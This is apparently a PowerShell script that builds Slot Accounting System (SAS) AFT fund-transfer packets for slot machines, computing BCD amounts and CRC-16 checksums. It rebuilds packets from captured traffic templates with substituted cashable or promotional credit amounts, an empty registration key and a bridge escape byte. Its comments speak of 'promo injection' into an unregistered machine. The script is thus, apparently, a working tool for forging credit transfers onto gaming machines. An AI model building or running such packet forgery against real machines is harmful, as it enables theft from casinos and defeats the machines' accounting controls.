Set-StrictMode -Version Latest
function ConvertTo-Hex {
    param([byte[]] $Bytes)
    -join ($Bytes | ForEach-Object { '{0:X2}' -f $_ })
}

function ConvertTo-Bcd5 {
    param([int64] $Value)
    if ($Value -lt 0 -or $Value -gt 9999999999) {
        throw "BCD amount out of range: $Value"
    }
    $digits = ('{0:D10}' -f $Value)
    $bytes = New-Object byte[] 5
    for ($i = 0; $i -lt 5; $i++) {
        $hi = [int][string]$digits[$i * 2]
        $lo = [int][string]$digits[$i * 2 + 1]
        $bytes[$i] = [byte](($hi -shl 4) -bor $lo)
    }
    return $bytes
}

function Get-SasCrc16 {
    param([byte[]] $Bytes)
    # SAS uses CRC-16/KERMIT (poly 0x1021 reflected as 0x8408), sent little-endian.
    $crc = 0
    foreach ($b in $Bytes) {
        $crc = $crc -bxor $b
        for ($i = 0; $i -lt 8; $i++) {
            if (($crc -band 1) -ne 0) {
                $crc = ($crc -shr 1) -bxor 0x8408
            }
            else {
                $crc = $crc -shr 1
            }
            $crc = $crc -band 0xFFFF
        }
    }
    return [uint16]$crc
}

function New-AftTransferPacket {
    param(
        [byte] $Address,
        # Backward-compatible alias for the non-restricted (promo) amount.
        [int64] $PromoAmountCents = 0,
        [int64] $CashableAmount = 0,
        [int64] $RestrictedAmount = 0,
        [int64] $NonRestrictedAmount = 0,
        [int] $Asset,
        [int] $TxnNumber
    )

    # Map the legacy single-amount call to the non-restricted field.
    if ($PromoAmountCents -gt 0 -and $NonRestrictedAmount -eq 0) {
        $NonRestrictedAmount = $PromoAmountCents
    }

    $data = New-Object System.Collections.Generic.List[byte]
    $data.Add(0x00) # transfer code: in-house amount from host to EGM
    $data.Add(0x00) # transaction index
    # Transfer type byte kept at 0x00 for all field selections. The existing
    # verified promo injection used 0x00; the cashable/restricted/non-restricted
    # routing is expressed purely by which BCD amount field is non-zero (see report).
    $data.Add(0x00) # transfer type
    $data.AddRange([byte[]](ConvertTo-Bcd5 $CashableAmount))       # cashable
    $data.AddRange([byte[]](ConvertTo-Bcd5 $RestrictedAmount))     # restricted
    $data.AddRange([byte[]](ConvertTo-Bcd5 $NonRestrictedAmount))  # non-restricted (promo)
    $data.Add(0x00) # transfer flags
    $data.AddRange([BitConverter]::GetBytes([uint32]$Asset)) # asset number little-endian
    $data.AddRange((New-Object byte[] 20))                   # registration key (machine NOT registered)

    $txnText = "est Transaction$TxnNumber"
    $txnBytes = New-Object System.Collections.Generic.List[byte]
    $txnBytes.Add(0x00)
    $txnBytes.AddRange([Text.Encoding]::ASCII.GetBytes($txnText))
    $data.Add([byte]$txnBytes.Count)
    $data.AddRange($txnBytes)

    $data.AddRange([byte[]](0x05, 0x30, 0x20, 0x20)) # expiration
    $data.AddRange([byte[]](0x0C, 0x00))             # pool id 0x000C
    $data.Add(0x00)                                  # receipt data length

    $packetNoCrc = New-Object System.Collections.Generic.List[byte]
    $packetNoCrc.Add($Address)
    $packetNoCrc.Add(0x72)
    $packetNoCrc.Add([byte]$data.Count)
    $packetNoCrc.AddRange($data)

    $crc = Get-SasCrc16 ([byte[]]$packetNoCrc.ToArray())
    $packetNoCrc.Add([byte]($crc -band 0xFF))
    $packetNoCrc.Add([byte](($crc -shr 8) -band 0xFF))
    return [byte[]]$packetNoCrc.ToArray()
}

function ConvertFrom-Hex {
    param([string] $Hex)
    $h = $Hex.Trim() -replace '\s', ''
    $bytes = New-Object byte[] ($h.Length / 2)
    for ($i = 0; $i -lt $h.Length; $i += 2) { $bytes[$i / 2] = [Convert]::ToByte($h.Substring($i, 2), 16) }
    return $bytes
}

function ConvertFrom-Bcd5 {
    param([byte[]] $Bytes)
    $digits = ''
    foreach ($b in $Bytes) { $digits += ('{0}{1}' -f (($b -shr 4) -band 0xF), ($b -band 0xF)) }
    return [int64]$digits
}

function New-AftTransferPacketFromParams {
    param(
        [ValidateSet('cashable','restricted','non-restricted')][string] $TransferType = 'non-restricted',
        [int64] $AmountCents,
        [int] $Asset = 777,
        [int] $TxnNumber = 0,
        [byte] $Address = 0x01
    )
    $ca=0; $re=0; $nr=0
    switch ($TransferType) {
        'cashable' { $ca = $AmountCents }
        'restricted' { $re = $AmountCents }
        default { $nr = $AmountCents }
    }
    return New-AftTransferPacket -Address $Address -CashableAmount $ca -RestrictedAmount $re -NonRestrictedAmount $nr -Asset $Asset -TxnNumber $TxnNumber
}

function Parse-AftCapturePacket {
    param([string] $Hex)
    $bytes = ConvertFrom-Hex $Hex
    $ca = ConvertFrom-Bcd5 $bytes[6..10]
    $re = ConvertFrom-Bcd5 $bytes[11..15]
    $nr = ConvertFrom-Bcd5 $bytes[16..20]
    $transferType = if ($ca -gt 0) { 'cashable' } elseif ($re -gt 0) { 'restricted' } else { 'non-restricted' }
    $amount = if ($ca -gt 0) { $ca } elseif ($re -gt 0) { $re } else { $nr }
    $txnLen = $bytes[46]
    $txnName = [Text.Encoding]::ASCII.GetString($bytes, 47, $txnLen).Trim([char]0)
    $txnNumber = 0
    if ($txnName -match '(\d+)$') { $txnNumber = [int]$Matches[1] }
    $body = $bytes[0..($bytes.Length - 3)]
    $crcWire = ConvertTo-Hex $bytes[($bytes.Length - 2)..($bytes.Length - 1)]
    $crcCalc = Get-SasCrc16 $body
    $crcCalcWire = '{0:X2}{1:X2}' -f ($crcCalc -band 0xFF), (($crcCalc -shr 8) -band 0xFF)
    [pscustomobject]@{
        Hex = $((ConvertTo-Hex $bytes).ToUpperInvariant())
        TransferType = $transferType
        AmountCents = $amount
        Asset = [int][BitConverter]::ToUInt32($bytes, 22)
        TxnName = $txnName
        TxnNumber = $txnNumber
        CrcValid = ($crcWire -eq $crcCalcWire)
    }
}

function Get-CapturedTemplates {
    (Get-Content -LiteralPath (Join-Path $PSScriptRoot 'captured_templates.json') -Raw | ConvertFrom-Json).captures
}

function Get-CapturedTemplate {
    param([string] $Id)
    $hit = Get-CapturedTemplates | Where-Object { $_.id -eq $Id } | Select-Object -First 1
    if (-not $hit) { throw "Template not found: $Id" }
    return $hit
}

function New-AftFromCaptureTemplate {
    param(
        [Parameter(Mandatory)][string] $TemplateId,
        [int64] $AmountCents = -1,
        [ValidateSet('cashable','restricted','non-restricted','')][string] $TransferType = '',
        [int] $TxnNumber = -1,
        [int] $Asset = -1
    )
    $tpl = Get-CapturedTemplate -Id $TemplateId
    $parsed = Parse-AftCapturePacket $tpl.hex
    $amt = if ($AmountCents -ge 0) { $AmountCents } else { [int64]$parsed.AmountCents }
    $type = if ($TransferType) { $TransferType } else { [string]$parsed.TransferType }
    $txn = if ($TxnNumber -ge 0) { $TxnNumber } else { [int]$parsed.TxnNumber }
    $asset = if ($Asset -ge 0) { $Asset } else { [int]$parsed.Asset }
    return New-AftTransferPacketFromParams -TransferType $type -AmountCents $amt -Asset $asset -TxnNumber $txn
}

function New-BridgePayload {
    param([byte[]] $SasPacket)
    $bridge = New-Object byte[] ($SasPacket.Length + 1)
    $bridge[0] = 0x1B
    [Array]::Copy($SasPacket, 0, $bridge, 1, $SasPacket.Length)
    return $bridge
}

function Format-AftPacketReport {
    param([byte[]] $SasPacket)
    $hex = ConvertTo-Hex $SasPacket
    $parsed = Parse-AftCapturePacket $hex
    $bridge = New-BridgePayload $SasPacket
    [pscustomobject]@{ SasHex = $hex.ToUpperInvariant(); BridgeHex = $((ConvertTo-Hex $bridge).ToUpperInvariant()); Parsed = $parsed }
}